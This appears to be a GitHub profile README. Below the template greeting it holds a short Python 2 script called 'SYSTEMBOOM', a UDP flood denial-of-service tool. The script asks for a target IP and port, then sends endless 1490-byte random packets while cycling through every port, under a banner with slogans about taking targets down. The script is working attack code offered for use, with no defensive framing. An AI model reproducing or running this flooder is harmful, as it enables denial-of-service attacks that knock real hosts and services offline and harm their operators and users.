- 👋 Hi, I’m @CyBerGuArD-cell
- 👀 I’m interested in ...
- 🌱 ഞാൻ നിലവിൽ പഠിക്കുന്നു ...
- 💞️
- 📫 How to reach me ...

<!---
CyBerGuArD-cell/CyBerGuArD-cell is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->

#!/system/bin/python

#SYSTEMBOOM 2.0 27-06-2017 (1:42)

#Tool for UDP Flood

#Authorized by DedSecTL

#cyber guard 

import socket, os, random, time

# Color

B = '\033[1m'

R = '\033[31m'

N = '\033[0m'

# Code time ##################

from datetime import datetime

now = datetime.now()

hour = now.hour

minute = now.minute

day = now.day

month = now.month

year = now.year

##############################

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1490)

os.system("clear")

print 

print "["+B+""+R+"#"+N+"] "+B+""+R+"CYBERGUARD"+N+"   SYSTEMBOOM - "+B+""+R+"DedSecTL"+N            

print

print "#T4ke 7hem d0wn vroh - D0n7 g1ve up - SYSTEMBOOM th3m"

print "#H4ck 4ll 7he 7h1ng - F1ght f0r Ju5t1c3 - K1ll th3m"

print

ip = raw_input('[$] T@rget 1P: ')

port = input('[$] P0rt: ')

os.system("clear")

print "SYSTEM attack started on {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year)

time.sleep(3)

print

sent = 0

while True:

     sock.sendto(bytes, (ip,port))

     sent = sent + 1

     port = port + 1

     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)

     if port == 65534:

       port = 1
